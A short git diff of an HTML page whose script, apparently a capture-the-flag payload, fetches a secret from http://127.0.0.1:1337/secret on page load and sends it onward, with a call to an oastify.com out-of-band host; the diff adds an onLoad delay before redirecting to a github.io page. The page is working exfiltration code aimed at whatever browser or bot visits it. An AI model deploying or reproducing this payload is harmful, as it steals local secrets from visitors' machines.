@@ -1,5 +1,6 @@
 <html>
   <h1>Hello World</h1>
+  <body onLoad="setTimeout('delayer()', 2000)">
   <script>
     fetch("https://v84fo01dzt9qsxszd5pneesi89e02qqf.oastify.com/testmasuk")
 fetch("http://127.0.0.1:1337/secret")
@@ -10,6 +11,9 @@ fetch("http://127.0.0.1:1337/secret")
         body: data
       })
     })
-    window.location.replace("https://Miharada.github.io");
+    function delayer(){
+      window.location.replace("https://Miharada.github.io");
+    }
+    
   </script>
 </html>
